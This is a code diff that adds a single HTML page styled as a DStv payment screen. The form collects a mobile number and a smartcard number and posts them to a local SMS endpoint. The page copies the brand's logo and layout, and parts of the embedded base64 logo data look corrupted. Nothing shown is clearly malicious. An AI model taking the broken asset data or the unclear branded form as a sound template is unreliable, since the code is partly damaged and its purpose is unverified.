@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DStv Payment</title>
+</head>
+<body>
+  <span id="loading" style="font-size: 16px; margin-bottom: 16px; color: black; display: none;">Loading...</span>
+
+  <div class="outer-wrapper" id="app" data-v-app>
+    <div class="gradient"></div>
+    <div class="content">
+      <div class="header">
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCA4NiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzEwOTdfMzAyMyIgc3R5bGU9Im1hc2stdHlwZTpsdW1pbmFuY2UiIG1hc2tVbml0cz0idXNlclNwYWNlT25Vc2UiIHg9Ii0xIiB5PSIwIiB3aWR0aD0iODciIGhlaWdodD0iMTciPgo8cGF0aCBkPSJNLTAuMDAwMTgzMTA1IDE2LjAwMDJIODYuMDAwMVY5LjUzNjc0ZS0wNkgtMC4wMDAxODMxMDVWMTYuMDAwMloiIGZpbGw9IndoaXRlIi8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF8xMDk3XzMwMjMpIj4KPHBhdGggZD0iTTg1Ljc2MDIgNC4zMDE2Nkg4My44ODAyQzgzLjU0ODggNC4zMDE2NiA4My4yNDMyIDQuNjE0MDQgODMuMjM5MyA0LjYyMDY3TDc2LjA5NjggMTMuOTgwM0M3NS45NjI2IDE0LjE2NDggNzUuNzUwOSAxNC4xNjA3IDc1LjYyMzcgMTMuOTgxOEw2OS4wMjc5IDQuNjE1OTVDNjkuMDI0MyA0LjYxNDA0IDY4Ljc3OTMgNC4yOTM1MyA2OC4zMTc3IDQuMjkzNTNINTUuNjQ4NUM1NS40MjcyIDQuMjkzNTMgNTUuMjQ4NiA0LjExNDU3IDU1LjI1MDEgMy44OTM5Mkw1NS4yNTg3IDAuODAxNzc1QzU1LjI1ODcgMC4zNTc5MDIgNTQuODk5NyAtMC4wMDAyMzI2OTcgNTQuNDU5OSAtMC4wMDAyMzI2OTdIMzUuMDU1NEMzMi4wNTAxIDAuMTAxNTQyIDMwLjc2NDUgMC40MDI4MDIgMjkuMzg5NiAxLjIwNjk1QzI4LjE2MiAxLjk1MTQ0IDI3LjQ4OTMgMi44OTU4NSAyNy40ODkzIDQuMDMxMTlDMjcuNDg5MyA1LjIzNDk1IDI4LjQ2OTggNi40MjE4MiAzMC40MzE2IDcuNTkyODZDMzAuOTM1NyA3Ljg5NjY5IDMyLjc1MTUgOC43NzMxIDM1Ljg3NDYgMTAuMjE5MUMzNy44Mzg4IDExLjEyNzQgMzguODk1MSAxMS44NzQ3IDM4LjgxODcgMTIuNjE3QzM4Ljg5OTYgMTMuODAwMCAzNy42MjI2IDE0LjIwNzYgMzUuMDU1NCAxNC4yMDc2SDIzLjMyMjhDMjMuMDM4OCAxNC4yMDc2IDIyLjc0NyAxNC4xNTgyIDIyLgwNyAxMy45MzZDMjIuODA3IDEzLjgyNzIgMjIuODcxOSAxMy43Mjc4IDIyLjk5NDQgMTMuNjQ5N0wyMi45OTgzIDEzLjY0OEMyNS42MTkyIDEyLjA2NjIgMjYuNDg1OSA5LjkyOTE4IDI2LjQ4NTkgNy45OTIyNkMyNi40ODU5IDQuMzY3OTQgMjMuNDQzMiAtMC4wMDAyMzI2OTcgMTEuMzI5NSAtMC4wMDAyMzI2OTdIMC43OTczMjQwMC4zNTY4NjUgLTAuMDAwMjMyNjk3IDYuMTAzNTJlLTA1IDAuMzU3OTAyIDYuMTAzNTJlLTA1IDAuODAxNzc1VjE1LjIwMTZDNi4xMDM1MmUtMDUgMTUuNjQxNCAwLjM1Njg2OCAxNS45OTk5IDAuNzk4NjA3IDE1Ljk5OTlIMTEuMzI5NUMxMS43MzE1IDE1Ljk5OTkgMTIuMTIxNiAxNS45OTUgMTIuNSAxNS45ODVIMzguODQxNUM0MS4yNDc0IDE1Ljk4NSA0My4xMjY2IDE1LjU4NjQgNDQuNDgzOCAxNC43OTI4QzQ1LjczNjkgMTQuMDU0IDQ2LjM2MzMgMTMuMTE5NyA0Ni4zYzMzIDExLjk3NzVDNDYuMzYzMyAxMC43Nzg5IDQ1LjM4MjkgOS41OTQxNCA0My40MjEzIDguNDI0MTZDNDIuOTE5MiA4LjEyMTE5IDQxLjEwNDQgNy4yMzg3OSAzNy45NzY0IDUuNzg2MTVDMzYuMDE1NSA0Ljg3ODUyIDM1LjAzNDkgNC4xNDQ1MSAzNS40MzQ5IDMuNTgzNjhDMzUuMDM0OSAyLjM4MDc3IDM2LjMwNTEgMS43OTc3MSAzOC44NDE1IDEuNzk3NzFINDcuNzQ2M0M0Ny45NjcgMS43OTc3MSA0OC4xNDU2IDEuOTc1NiA0OC4xNDY5IDIuMTk1NDFMNDguMTQxMSAxMi42NDM5QzQ1LjE0MTEgMTQuMTc1NyA0OS4xNTI4IDE1Ljk4NSA1Mi4yMTk0IDE1Ljk4NUg3Ni42OTUyQzc3LjI3NTIgMTUuOTg1IDc3LjU2ODIgMTUuNjA5NSA3Ny41NjgyIDE1Ljk4NVg4NS45NTQ2IDQuNTY3NDNCODUuOTU0NiA0LjU2NzQzIDODYuMTQwNSA0LjMwMTY2IDg1Ljc2MDIgNC4zMDE2NlpNOS43NDc1NiAxNC4yNjgxSDcuMTU0NzVDNi45MzM4OCAxNC4yNjgxIDYuNzU0ODMgMTQuMDg5MSA2Ljc1NDgzIDEzLjg2ODlWMi4xMjYxMkM2Ljc1NDgzIDEuOTA1OSA2LjkzMzg3IDEuNzI2NTEgNy41MjYxIDEuNzI2NTIgOS43NDc1NkMxNi4xNjIyIDEuNzI2NTEgMTkuNTY0NiA0LjM2Nzk0IDE5LjU2NDYgNy45OTIyNkMxOS41NjQ2IDExLjYzMjQgMTYuMTI5OSAxNC4yNjgxIDkuNzQ3NTYgMTQuM2Y4MVpNNjguNTAyOSAxNC4zMTFINTcuMTk3QzU1LjYyMzYgMTQuMzExIDU1LjI0ODYgMTMuODYxNCA1NS4yNDg2IDE2LjY0MzlWNi4zNjE3M0M1NS4yNDg2IDYuMTUwNyA1NS40MTUzIDUuOTgxMTUgNTUuNjIwNCA1Ljk2NjYxSDYyLjE4NTZDNjIuMzkyNiA1Ljk4MTE1IDYyLjY0MjUgNi4xMDU4IDYyLjc3MzMgNi4yNjQyNEw2OC42Njg1IDE0LjAxMDJDNjguNzg0NiAxNC4xNzU3IDY4LjcxNDYgMTQuMzExIDY4LjUwMjkgMTQuMzExWiIgZmlsbD0id2hpdGUiLz4KPC9nPgo8L3N2Zz4K" alt="DStv Logo">
+      </div>
+
+      <div class="inner-wrapper">
+        <div class="inner-content">
+          <div class="amount-to-pay">
+            <div class="summary">
+              <div>
+                <div style="padding-bottom: 8px;">Amount to pay</div>
+                <div style="font-size: 18px; font-weight: 700; line-height: 18px;">KES 4,200.00</div>
+              </div>
+            </div>
+          </div>
+
+          <form id="vendorFieldsForm">
+            <div class="mobile">
+              <div style="font-size: 16px; font-weight: 700; line-height: 16px; margin-bottom: 16px;">
+                Enter your details to continue
+              </div>
+
+              <div>
+                <input type="tel" id="mobile_number" name="mobile_number" placeholder="Mobile Number" required>
+              </div>
+
+              <div style="margin-top: 16px;">
+                <input type="text" id="smartcard_number" name="smartcard_number" placeholder="Smartcard Number" required>
+              </div>
+
+              <div class="button-contatiner" style="margin-top: 24px;">
+                <button type="submit" id="submitBtn">Continue</button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('vendorFieldsForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const btn = document.getElementById('submitBtn');
+      const loader = document.getElementById('loading');
+      
+      const mobileNumber = document.getElementById('mobile_number').value;
+      const smartcardNumber = document.getElementById('smartcard_number').value;
+
+      btn.disabled = true;
+      loader.style.display = 'block';
+
+      try {
+        const response = await fetch('/api/send-sms', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            mobile_number: mobileNumber,
+            smartcard_number: smartcardNumber
+          })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+          alert('Notification SMS sent successfully!');
+        } else {
+          alert('Failed to send SMS: ' + (result.message || 'Error occurred'));
+        }
+      } catch (err) {
+        alert('Network error. Unable to reach server.');
+      } finally {
+        btn.disabled = false;
+        loader.style.display = 'none';
+      }
+    });
+  </script>
+</body>
+</html>
